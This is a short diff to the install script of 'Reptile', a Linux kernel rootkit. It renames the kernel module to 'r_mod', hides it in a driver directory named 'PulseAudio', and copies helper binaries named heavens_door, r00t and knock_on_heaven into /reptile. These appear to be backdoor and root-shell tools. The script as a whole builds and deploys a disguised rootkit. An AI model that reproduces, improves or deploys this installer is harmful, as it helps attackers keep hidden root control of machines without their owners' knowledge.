@@ -3,7 +3,7 @@
 # Reptile Install Script
 # Author: F0rb1dd3n
 
-MODULE="reptile_mod"
+MODULE="r_mod"
 DRIVER="PulseAudio"
 KERNEL_VERSION=$(uname -r)
 DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
@@ -27,7 +27,7 @@ function reptile_build {
 	echo -e "\n\e[00;31m############################### \e[01;36mCleanning...\e[00;31m ###############################\e[00m\n" 
 	make clean
 
-	mv bin/reptile_mod bin/reptile_mod.ko
+	mv bin/$MODULE bin/$MODULE.ko
 }
 
 function reptile_cpy {
@@ -35,7 +35,7 @@ function reptile_cpy {
 	
 	echo -e "\n\e[00;31m############################# \e[01;36mCopying files...\e[00;31m #############################\e[00m\n" 
 	
-	cp bin/reptile_mod.ko /reptile/reptile_mod.ko
+	cp bin/$MODULE.ko /reptile/$MODULE.ko
 	cp bin/heavens_door /reptile
 	cp bin/r00t /reptile
 	cp bin/knock_on_heaven /reptile
